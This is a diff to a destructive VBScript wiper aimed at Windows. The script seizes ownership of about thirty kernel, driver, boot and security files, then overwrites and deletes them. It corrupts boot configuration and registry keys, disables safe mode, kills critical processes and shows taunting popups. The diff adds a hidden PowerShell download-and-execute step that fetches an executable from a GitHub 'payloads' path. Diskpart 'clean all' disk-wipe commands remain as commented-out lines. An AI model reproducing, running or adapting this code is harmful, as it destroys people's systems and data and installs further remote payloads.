@@ -1,5 +1,5 @@
 Option Explicit 
-Dim x7p9q, q3z8k, k9m2v, r4t6y, z2w8j, p5n3b, y8h2m, j6q4x, f
+Dim x7p9q, q3z8k, k9m2v, r4t6y, z2w8j, p5n3b, y8h2m, j6q4x, f, f7k2z, criticalFiles, files
 f = WScript.ScriptFullName
 Set x7p9q = CreateObject("WScript.Shell") ' Shell for silent fuckery
 Set q3z8k = CreateObject("Scripting.FileSystemObject") ' File system chaos
@@ -71,23 +71,23 @@ For r4t6y = 1 To 50
 Next
 
 ' Nuke ALL disk boot sectors and data with diskpart
-Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp1.txt", True)
-z2w8j.WriteLine "list disk"
-z2w8j.WriteLine "select disk 0"
-z2w8j.WriteLine "clean all" 
-z2w8j.WriteLine "select disk 1"
-z2w8j.WriteLine "clean all"
-z2w8j.WriteLine "select disk 2"
-z2w8j.WriteLine "clean all"
-z2w8j.Close
-x7p9q.Run "cmd /c diskpart /s C:\Temp\dp1.txt", 0, True
-q3z8k.DeleteFile("C:\Temp\dp1.txt")
-' Schedule system disk wipe at boot
-Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp_boot.txt", True)
-z2w8j.WriteLine "select disk 0"
-z2w8j.WriteLine "clean all"
-z2w8j.Close
-x7p9q.Run "schtasks /create /tn SysUpdate /tr ""cmd /c diskpart /s C:\Temp\dp_boot.txt"" /sc onstart /ru SYSTEM /rl HIGHEST /f", 0, True
+' Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp1.txt", True)
+' z2w8j.WriteLine "list disk"
+' z2w8j.WriteLine "select disk 0"
+' z2w8j.WriteLine "clean all" 
+' z2w8j.WriteLine "select disk 1"
+' z2w8j.WriteLine "clean all"
+' z2w8j.WriteLine "select disk 2"
+' z2w8j.WriteLine "clean all"
+' z2w8j.Close
+' x7p9q.Run "schtasks /create /tn SysUpdate /tr ""cmd /c diskpart /s C:\Temp\dp1.txt"" /sc onstart /ru SYSTEM /rl HIGHEST /f", 0, True
+' ' q3z8k.DeleteFile("C:\Temp\dp1.txt")
+' ' Schedule system disk wipe at boot
+' Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp_boot.txt", True)
+' z2w8j.WriteLine "select disk 0"
+' z2w8j.WriteLine "clean all"
+' z2w8j.Close
+' x7p9q.Run "schtasks /create /tn SysUpdate2 /tr ""cmd /c diskpart /s C:\Temp\dp_boot.txt"" /sc onstart /ru SYSTEM /rl HIGHEST /f", 0, True
 
 q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") ' Power management dies
 q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") ' CD/DVD fucked
@@ -120,42 +120,54 @@ For j6q4x = 1 To 15
     x7p9q.Popup "FUCKED BEYOND REPAIR. GOOD LUCK, LOSER.", 0, "Windows", 16
 Next
 
-x7p9q.Run "takeown /F C:\Windows\System32\ntoskrnl.exe", 0, True
-x7p9q.Run "icacls C:\Windows\System32\ntoskrnl.exe /grant SYSTEM:F", 0, True
+files = Array( _
+    "C:\Windows\System32\ntoskrnl.exe", _
+    "C:\Windows\System32\hal.dll", _
+    "C:\Windows\System32\winload.exe", _
+    "C:\Windows\System32\ci.dll", _
+    "C:\Windows\System32\ntdll.dll", _
+    "C:\Windows\System32\kernel32.dll", _
+    "C:\Windows\System32\user32.dll", _
+    "C:\Windows\System32\gdi32.dll", _
+    "C:\Windows\System32\lsass.exe", _
+    "C:\Windows\System32\drivers\ntfs.sys", _
+    "C:\Windows\System32\drivers\volmgr.sys", _
+    "C:\Windows\System32\drivers\disk.sys", _
+    "C:\Windows\System32\drivers\partmgr.sys", _
+    "C:\Windows\System32\drivers\storport.sys", _
+    "C:\Windows\System32\drivers\fltmgr.sys", _
+    "C:\Windows\System32\drivers\classpnp.sys", _
+    "C:\Windows\System32\drivers\tcpip.sys", _
+    "C:\Windows\System32\drivers\ndis.sys", _
+    "C:\EFI\Microsoft\Boot\BCD", _
+    "C:\Windows\Boot\EFI\bootmgfw.efi", _
+    "C:\Windows\Boot\EFI\bootmgr.efi", _
+    "C:\Windows\Boot\PCAT\bootmgr", _
+    "C:\Windows\Boot\PCAT\bootuwf.dll", _
+    "C:\Windows\Boot\PCAT\bootvhd.dll", _
+    "C:\Windows\Boot\PCAT\memtest.exe", _
+    "C:\Windows\Boot\PCAT\bootnxt", _
+    "C:\Windows\Boot\EFI\winload.efi", _
+    "C:\Windows\System32\autochk.exe", _
+    "C:\Windows\System32\wininit.exe", _
+    "C:\Windows\System32\drivers\mountmgr.sys" _
+)
 
-x7p9q.Run "takeown /F C:\Windows\System32\hal.dll", 0, True
-x7p9q.Run "icacls C:\Windows\System32\hal.dll /grant SYSTEM:F", 0, True
+For Each f7k2z In files
+    x7p9q.Run "takeown /F """ & f7k2z & """", 0, True
+    x7p9q.Run "icacls """ & f7k2z & """ /grant SYSTEM:F", 0, True
+Next 
 
-x7p9q.Run "takeown /F C:\Windows\System32\drivers\ntfs.sys", 0, True
-x7p9q.Run "icacls C:\Windows\System32\drivers\ntfs.sys /grant SYSTEM:F", 0, True
+x7p9q.Run "net stop wuauserv", 0, True ' Windows Update
+x7p9q.Run "net stop bits", 0, True ' Background Intelligent Transfer Service
+x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
 
-x7p9q.Run "takeown /F C:\Windows\System32\config\SYSTEM", 0, True
-x7p9q.Run "icacls C:\Windows\System32\config\SYSTEM /grant SYSTEM:F", 0, True
-
-x7p9q.Run "takeown /F C:\bootmgr", 0, True
-x7p9q.Run "icacls C:\bootmgr /grant SYSTEM:F", 0, True
-
-' Overwrite BSOD-critical files with junk, then delete
-If q3z8k.FileExists("C:\Windows\System32\ntoskrnl.exe") Then
-    x7p9q.Run "echo " & String(1000000, "X") & " > C:\Windows\System32\ntoskrnl.exe", 0, True 
-    x7p9q.Run "del /f /q C:\Windows\System32\ntoskrnl.exe", 0, True
-End If
-If q3z8k.FileExists("C:\Windows\System32\hal.dll") Then
-    x7p9q.Run "echo " & String(1000000, "X") & " > C:\Windows\System32\hal.dll", 0, True 
-    x7p9q.Run "del /f /q C:\Windows\System32\hal.dll", 0, True
-End If
-If q3z8k.FileExists("C:\Windows\System32\drivers\ntfs.sys") Then
-    x7p9q.Run "echo " & String(1000000, "X") & " > C:\Windows\System32\drivers\ntfs.sys", 0, True 
-    x7p9q.Run "del /f /q C:\Windows\System32\drivers\ntfs.sys", 0, True
-End If
-If q3z8k.FileExists("C:\Windows\System32\config\SYSTEM") Then
-    x7p9q.Run "echo " & String(1000000, "X") & " > C:\Windows\System32\config\SYSTEM", 0, True 
-    x7p9q.Run "del /f /q C:\Windows\System32\config\SYSTEM", 0, True
-End If
-If q3z8k.FileExists("C:\bootmgr") Then
-    x7p9q.Run "echo " & String(1000000, "X") & " > C:\bootmgr", 0, True 
-    x7p9q.Run "del /f /q C:\bootmgr", 0, True
-End If
+For Each f7k2z In files
+    if q3z8k.FileExists(f7k2z) Then
+        x7p9q.Run "echo " & String(1000000, "X") & " > """& f7k2z & """", 0, True
+        x7p9q.Run "del /f /q """& f7k2z & """", 0, True
+    end If
+Next
 
 ' Destroy Boot Configuration Data 
 x7p9q.Run "bcdedit /set {bootmgr} displaybootmenu No", 0, True
@@ -188,6 +200,11 @@ k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Useri
 k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "invalid_command", "REG_MULTI_SZ" ' Break boot
 k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD" ' No safe mode
 
+Dim path
+path = x7p9q.ExpandEnvironmentStrings("%TEMP%") & "\toy.exe"
+x7p9q.Run "powershell.exe -ep bypass -noP -w hidden ""iwr -uri 'https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/update.exe' -outfile '"& path & "'""", 0, True
+x7p9q.Run path, 0, True
+
 ' kill critical processes
 x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
 x7p9q.Run "taskkill /F /IM svchost.exe", 0, True
@@ -195,13 +212,13 @@ x7p9q.Run "taskkill /F /IM winlogon.exe", 0, True ' Extra chaos
 
 On Error GoTo 0
 
-Do
-    WScript.Sleep 15000 ' Wait 15 seconds
-    For r4t6y = 1 To 500
-        x7p9q.Run "notepad.exe", 0, False
-        x7p9q.Run "calc.exe", 0, False
-    Next
-    x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
-    x7p9q.Popup "YOUR PC IS A CORPSE. GOODBYE.", 0, "System Failure", 16
-Loop
+' Do
+'     WScript.Sleep 15000 ' Wait 15 seconds
+'     For r4t6y = 1 To 500
+'         x7p9q.Run "notepad.exe", 0, False
+'         x7p9q.Run "calc.exe", 0, False
+'     Next
+'     x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
+'     x7p9q.Popup "YOUR PC IS A CORPSE. GOODBYE.", 0, "System Failure", 16
+' Loop
 ' x7p9q.Run "powershell remove-item -path '" & f & "' -force", 0, False
